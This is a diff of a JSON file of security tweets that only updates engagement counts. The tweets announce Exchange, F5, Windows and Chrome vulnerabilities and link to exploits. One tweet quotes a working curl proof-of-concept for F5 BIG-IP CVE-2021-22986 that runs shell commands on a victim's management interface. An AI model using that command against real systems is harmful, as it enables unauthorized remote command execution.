@@ -139,7 +139,7 @@
     "username": "iamelli0t"
 }
 {
-    "tweetfavorites": 387,
+    "tweetfavorites": 381,
     "tweetquotes": 5,
     "tweetreplies": 13,
     "tweetretweets": 107,
@@ -149,10 +149,10 @@
     "username": "JanmeyjaySharma"
 }
 {
-    "tweetfavorites": 200,
+    "tweetfavorites": 189,
     "tweetquotes": 1,
-    "tweetreplies": 4,
-    "tweetretweets": 44,
+    "tweetreplies": 3,
+    "tweetretweets": 42,
     "tweettext": "Unauthenticated Remote Command Execution Vulnerability [CVE-2021-22986]  - POC 😎🤓\n\n#RCE #Exploit #ItTakesACrowd @Bugcrowd @Hacker0x01 https://t.co/adbDsEzDUi",
     "tweettime": "2021-03-24, 00:40:08",
     "tweeturl": "https://twitter.com/JanmeyjaySharma/status/1374521379345768457",
@@ -304,10 +304,10 @@
     "expanded_url": [
         "https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986"
     ],
-    "tweetfavorites": 789,
-    "tweetquotes": 30,
-    "tweetreplies": 11,
-    "tweetretweets": 387,
+    "tweetfavorites": 734,
+    "tweetquotes": 27,
+    "tweetreplies": 10,
+    "tweetretweets": 361,
     "tweettext": "F5 BIG-IP iControl RCE (CVE-2021-22986)\n\nexecute arbitrary system commands\ncreate or delete files\ndisable services\n\nPoC #1\ncurl -su admin: -H \"Content-Type: application/json\" http://[victimIP]/mgmt/tm/util/bash -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'\n\nhttps://t.co/6i3IYFeHt5 https://t.co/yzD1k3ClTF",
     "tweettime": "2021-03-18, 03:41:30",
     "tweeturl": "https://twitter.com/wugeej/status/1372392693989445635",
@@ -337,10 +337,10 @@
     "username": "buffaloverflow"
 }
 {
-    "tweetfavorites": 202,
-    "tweetquotes": 8,
+    "tweetfavorites": 190,
+    "tweetquotes": 7,
     "tweetreplies": 4,
-    "tweetretweets": 114,
+    "tweetretweets": 105,
     "tweettext": "Microsoft has released a new, one-click mitigation tool to help customers who do not have dedicated security or IT teams to apply the Exchange security updates\n\n1⃣ Applies CVE-2021-26855 mitigation\n\n2⃣ Runs MSERT scan\n\n3⃣ Reverse any changes made by identified threats https://t.co/UEhNQC8NEM",
     "tweettime": "2021-03-15, 22:55:44",
     "tweeturl": "https://twitter.com/tanmayg/status/1371596003770466307",
@@ -386,10 +386,10 @@
     "expanded_url": [
         "https://gitlab.com/gvillegas/ohwaa/"
     ],
-    "tweetfavorites": 286,
+    "tweetfavorites": 281,
     "tweetquotes": 9,
-    "tweetreplies": 5,
-    "tweetretweets": 162,
+    "tweetreplies": 4,
+    "tweetretweets": 160,
     "tweettext": "OhWAA, A functional exploit of CVE-2021-26855 to download emails from mailboxes on OWA instances.\n\nhttps://t.co/WKKCMb0hqu\n\nBy Gonzalo Villegas a.k.a Cl34r 💪\n\n#Exploit #CVE_2021_26855 #Exchange https://t.co/grso3u4XEz",
     "tweettime": "2021-03-13, 07:01:05",
     "tweeturl": "https://twitter.com/1ZRR4H/status/1370630982521528320",
@@ -399,10 +399,10 @@
     "expanded_url": [
         "https://thehackernews.com/2021/03/another-google-chrome-0-day-bug-found.html"
     ],
-    "tweetfavorites": 354,
-    "tweetquotes": 23,
-    "tweetreplies": 10,
-    "tweetretweets": 301,
+    "tweetfavorites": 310,
+    "tweetquotes": 21,
+    "tweetreplies": 9,
+    "tweetretweets": 263,
     "tweettext": "🔥 WARNING — A second Google #Chrome browser zero-day #vulnerability (CVE-2021-21193) has been found actively exploited in-the-wild.\n\nRead details: https://t.co/EFt5OinSKa\n\nUpdate your browser for Windows, Mac, and #Linux systems to 89.0.4389.90 or the latest available version.",
     "tweettime": "2021-03-13, 03:24:15",
     "tweeturl": "https://twitter.com/TheHackersNews/status/1370576411648352260",
@@ -445,7 +445,7 @@
     "username": "j00ru"
 }
 {
-    "tweetfavorites": 286,
+    "tweetfavorites": 279,
     "tweetquotes": 1,
     "tweetreplies": 4,
     "tweetretweets": 45,
@@ -459,10 +459,10 @@
         "https://paper.seebug.org/1501/",
         "https://testbnull.medium.com/ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265"
     ],
-    "tweetfavorites": 328,
+    "tweetfavorites": 322,
     "tweetquotes": 4,
     "tweetreplies": 3,
-    "tweetretweets": 162,
+    "tweetretweets": 159,
     "tweettext": "CVE-2021-26855 [SSRF] + CVE-2021-27065 [Arbitrary File Write] =&gt;&gt; Exchange Unauth GetWebShell\n\nhttps://t.co/p2cwg9NNxM\n\nhttps://t.co/ziex5fvKbx https://t.co/KSNdp5B3af",
     "tweettime": "2021-03-11, 11:13:47",
     "tweeturl": "https://twitter.com/jas502n/status/1369969798994558982",
@@ -522,10 +522,10 @@
     "expanded_url": [
         "https://research.nccgroup.com/2021/03/10/technical-advisory-dell-supportassist-local-privilege-escalation-cve-202-21518/"
     ],
-    "tweetfavorites": 257,
+    "tweetfavorites": 239,
     "tweetquotes": 5,
-    "tweetreplies": 10,
-    "tweetretweets": 99,
+    "tweetreplies": 9,
+    "tweetretweets": 89,
     "tweettext": "Here is the advisory for CVE-2021-21518, which is a Local Privilege Escalation vulnerability I found in Dell SupportAssist\n\n https://t.co/VqeGRB1gu0 https://t.co/45U0HWFpdz",
     "tweettime": "2021-03-10, 16:52:15",
     "tweeturl": "https://twitter.com/buffaloverflow/status/1369692589193039874",
@@ -624,10 +624,10 @@
     "expanded_url": [
         "https://github.com/GreyOrder/CVE-2021-26855"
     ],
-    "tweetfavorites": 494,
-    "tweetquotes": 13,
+    "tweetfavorites": 481,
+    "tweetquotes": 11,
     "tweetreplies": 14,
-    "tweetretweets": 192,
+    "tweetretweets": 185,
     "tweettext": "Thousands of US companies have been hacked by Chinese hackers using This RCE.\n\nMicrosoft Exchange Server Remote Code Execution CVE-2021-26855 Exploit.\nhttps://t.co/4UNlGK3ewf\n\n#BugBounty #RCE #infosec https://t.co/YKWOCIKjXk",
     "tweettime": "2021-03-09, 11:51:50",
     "tweeturl": "https://twitter.com/h4x0r_dz/status/1369254600612708362",
@@ -638,10 +638,10 @@
         "https://github.com/KaLendsi/CVE-2021-1732-Exploit",
         "https://bbs.pediy.com/thread-266362.htm"
     ],
-    "tweetfavorites": 648,
+    "tweetfavorites": 629,
     "tweetquotes": 9,
     "tweetreplies": 2,
-    "tweetretweets": 290,
+    "tweetretweets": 280,
     "tweettext": "CVE-2021-1732 Exploit\nWindows Win32k Elevation of Privilege Vulnerability\nhttps://t.co/85CVDIqTHd\nPoc &amp; Exp report:\nhttps://t.co/avxh6fm3dA https://t.co/nhaSuhfB7u",
     "tweettime": "2021-03-09, 08:36:38",
     "tweeturl": "https://twitter.com/blackorbird/status/1369205476555071494",
@@ -676,10 +676,10 @@
         "https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py",
         "https://docs.microsoft.com/zh-cn/exchange/client-developer/web-service-reference/distinguishedfolderid"
     ],
-    "tweetfavorites": 364,
+    "tweetfavorites": 352,
     "tweetquotes": 4,
-    "tweetreplies": 5,
-    "tweetretweets": 185,
+    "tweetreplies": 4,
+    "tweetretweets": 182,
     "tweettext": "use #CVE-2021-26855 ssrf dump email content...\n\nPs: In the X-BackEndCookie cookie you will find a SID.\n\nhttps://t.co/MeOjL5K2D4\nhttps://t.co/kBFCGDo1kd\nhttps://t.co/L4zgQa3Y63 https://t.co/I9X8QnFrHY",
     "tweettime": "2021-03-08, 11:14:52",
     "tweeturl": "https://twitter.com/jas502n/status/1368882907893223425",
@@ -719,10 +719,10 @@
     "username": "Dinosn"
 }
 {
-    "tweetfavorites": 580,
+    "tweetfavorites": 569,
     "tweetquotes": 7,
-    "tweetreplies": 7,
-    "tweetretweets": 199,
+    "tweetreplies": 6,
+    "tweetretweets": 193,
     "tweettext": "CVE-2021-26855: Exchange Server SSRF Vulnerability\n\n#CVE https://t.co/usGib73iZU",
     "tweettime": "2021-03-06, 07:22:40",
     "tweeturl": "https://twitter.com/Madrobot_/status/1368099698565812228",
@@ -784,10 +784,10 @@
     "expanded_url": [
         "http://Microsoft.Exchange.UM"
     ],
-    "tweetfavorites": 302,
+    "tweetfavorites": 291,
     "tweetquotes": 2,
     "tweetreplies": 2,
-    "tweetretweets": 114,
+    "tweetretweets": 110,
     "tweettext": "CVE-2021-26857 is a Exchange Binary Formatter Deserialization RCE triggered in the https://t.co/zFQr12LQ7k.UMCore.PipelineContext class within the FromHeaderFile method via the contactInfo type. Second order deserialization which requires unified messaging enabled (common config) https://t.co/J1VyqWMFMY",
     "tweettime": "2021-03-03, 19:45:22",
     "tweeturl": "https://twitter.com/steventseeley/status/1367199438347894789",
@@ -898,7 +898,7 @@
     "expanded_url": [
         "https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred"
     ],
-    "tweetfavorites": 692,
+    "tweetfavorites": 691,
     "tweetquotes": 11,
     "tweetreplies": 14,
     "tweetretweets": 273,
